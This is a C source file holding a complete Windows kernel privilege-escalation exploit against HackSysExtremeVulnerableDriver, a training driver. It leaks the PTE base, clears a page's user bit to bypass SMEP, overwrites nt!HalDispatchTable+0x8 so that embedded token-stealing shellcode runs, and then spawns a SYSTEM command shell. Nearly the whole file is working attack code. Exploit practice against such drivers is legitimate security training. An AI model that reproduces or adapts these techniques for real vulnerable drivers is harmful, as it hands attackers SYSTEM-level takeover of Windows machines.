// Note: Need to implement code for HAL+0x8 restoration
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <Psapi.h>

#define IO_CODE 0x22200B
#define ARRAY_SIZE 1024

typedef NTSTATUS(WINAPI *NTQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);

// Function used to allocate a memory region for tokenstealing LPE technique
DWORD64 getTokensteal() {
    char shellcode[] = "\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80\xB8\x00\x00\x00\x48\x89\xC3\x48\x8B\x9B\xF0\x02\x00\x00\x48\x81\xEB\xF0\x02\x00\x00\x48\x8B\x8B\xE8\x02\x00\x00\x48\x83\xF9\x04\x75\xE5\x48\x8B\x8B\x58\x03\x00\x00\x80\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x48\x31\xC0\xC3";

    printf("[+] Allocating memory region for shellcode..\n");
    LPVOID Alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!Alloc) {
        printf("[-] Error - Unable to allocate memory region for tokenstealing shellcode..");
        exit(1);
    }
    RtlMoveMemory(Alloc, shellcode, sizeof(shellcode));
    printf("[+] Successfully copied tokenstealing shellcode to memory region at: 0x%llX\n", Alloc);
    return (DWORD64)Alloc;
}

// Function used for locating the NtOsKrnl.exe address
DWORD64 getKernel(void){
	LPVOID lpImageBase[ARRAY_SIZE];
	DWORD lpcbNeeded;
	int drivers;

	char lpFileName[ARRAY_SIZE];
	DWORD64 krnlBase;

	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);

	for(int i = 0; i < drivers; i++){
		GetDeviceDriverBaseNameA(lpImageBase[i], lpFileName, sizeof(lpFileName) / sizeof(char));
		if(!strcmp("ntoskrnl.exe", lpFileName)){
			krnlBase = (DWORD64)lpImageBase[i];
			break;
		}
	}
	return krnlBase;
}

// Function used for calculating the address of nt!HalDispatchTable+0x8
DWORD64 getHal(DWORD64 kernelAddr) {
    DWORD64 Hal8;

    HMODULE hUserSpaceBase = LoadLibraryExA("ntoskrnl.exe", NULL, 0x1);
    PVOID pUserSpaceAddr = GetProcAddress(hUserSpaceBase, "HalDispatchTable");
    printf("[+] Found HalDispatchTable.. proceeding to calculate the address of HalDispatchTable+0x8.\n");

    Hal8 = (kernelAddr + (ULONG_PTR)pUserSpaceAddr) - (ULONG_PTR)hUserSpaceBase + 0x8;
    printf("[+] Address of HalDispatchTable+0x8 is: 0x%llx\n", Hal8);

    return Hal8;
}

// Function used to calculate PTE Address of the allocated memory region for the tokenstealing LPE technique
DWORD64 getTokenPte(DWORD64 pteBaseAddr, DWORD64 shellcode){
    DWORD64 tokenPte;

    printf("[+] Calculating PTE for the tokenstealing shellcode memory region at 0x%llX..\n", shellcode);
    printf("[+] Step 1: Shifting address of allocated memory region 9 bits right..\n");
    tokenPte = shellcode >> 9;
    printf("[+] Step 2: Performing bitwise AND assignment with '0x7FFFFFFFF8'..\n");
    tokenPte &= 0x7FFFFFFFF8;
    printf("[+] Step 3: Adding base address of PTEs..\n");
    tokenPte += pteBaseAddr;
    return tokenPte;
}

// Function used to setup lpInBuffer/nInBufferSize and interact with HEVD driver
int interact(HANDLE handle, DWORD64 what, DWORD64* where){
    DWORD bytesRetn;
    char expl[0x10];

    memset(expl, 'A', 0x10);
    memcpy(&expl, &what, 0x8);
    memcpy(&expl[0x8], &where, 0x8);

    printf("[+] Starting interaction with the driver..\n");
    DeviceIoControl(handle, IO_CODE, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);
}

int main(void){
    // Open a handle to the HEVD driver object
    printf("[+] Calling CreateFileA() to obtain a handle to the driver..\n");
    HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[-] Error - Unable to obtain a handle to the driver.\n");
        exit(1);
    }
    printf("[+] Successfully obtained a handle to the driver.\n");

    // Locate/Print the kernel addresses of NT and nt!MiGetPteAddress+0x13
    DWORD64 pGetKernel = getKernel();
    DWORD64 miGetPte = getKernel() + 0x651a7;
    printf("[+] Base address of ntoskrnl.exe is: 0x%llx\n", pGetKernel);
    printf("[+] Address of MiGetPteAddress+0x13: 0x%llx\n", miGetPte);

    // Retrieve the value stored in nt!MiGetPteAddress+013
    DWORD64 placeholder = 0;
    DWORD64* basePte = &placeholder;
    interact(hDriver, miGetPte, basePte);
    DWORD64 pteBase = *basePte;
    printf("[+] Successfully leaked the base address for PTEs: 0x%llX\n", pteBase);

    // Calculate the PTE address for allocated memory region holding tokenstealing LPE technique
    DWORD64 pGetTokensteal = getTokensteal();
    DWORD64 tokenPteAddr = getTokenPte(pteBase, pGetTokensteal);
    printf("[+] Found PTE for the allocated memory region at: 0x%llX\n", tokenPteAddr);

    // Retrieve the value stored in the PTE address of the allocated memory region (Currently owned by User Mode)
    placeholder = 0;
    DWORD64* bitsPteTokenU = &placeholder;
    interact(hDriver, tokenPteAddr, bitsPteTokenU);
    DWORD64 pteControlBits = *bitsPteTokenU;
    printf("[+] Identified PTE control bits for allocated memory region: %llX\n", pteControlBits);

    // Update the Value stored in the PTE address of the allocated memory region (Update ownership to Kernel Mode)
    DWORD64 taintedPte = pteControlBits & 0xFFFFFFFFFFFFFFFB;
    DWORD64* taintedControlBits = &taintedPte;
    printf("[+] Disabling SMEP by switching PTE control bit from User to Kernel..\n");
    interact(hDriver, (DWORD64)taintedControlBits, (DWORD64*)tokenPteAddr);
    printf("[+] Successfully updated PTE control bits for allocated memory region at %llX to: %llX\n", tokenPteAddr, taintedPte);
    printf("[+] Allocated memory region is now kernel mode..\n");

    // Overwrite nt!HalDispatchTable+0x8 to point to allocated memory region
    DWORD64 pGetHal = getHal(pGetKernel);
    DWORD64* tokenPointer = &pGetTokensteal;
    printf("[+] Pointer to tokenstealing shellcode is at: 0x%llX\n", tokenPointer);
    printf("[+] Overwriting HalDispatchTable+0x8 (0x%llX) with the address of tokenstealing shellcode (0x%llX)..\n", pGetHal, pGetTokensteal);
    interact(hDriver, (DWORD64)tokenPointer, (DWORD64*)pGetHal);
    printf("[+] Successfully overwrote nt!HalDispatchTable+0x8..\n");

    // Call nt!NtQueryIntervalProfile to trigger a call to nt!HalDispatchTable+0x8
    NTQueryIntervalProfile_t NtQueryIntervalProfile = (NTQueryIntervalProfile_t)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtQueryIntervalProfile");
    if (!NtQueryIntervalProfile) {
        printf("[-] Error - Failed to locate NtQueryIntervalProfile\n");
    }
    printf("[+] Found NtQueryIntervalProfile Address at: 0x%llX\n", NtQueryIntervalProfile);

    ULONG NtQueryInterval;
    NtQueryIntervalProfile(6055, &NtQueryInterval);

    // Clean-up and spawn SYSTEM shell
    CloseHandle(hDriver);
    system("cmd.exe");
    return 0;
}
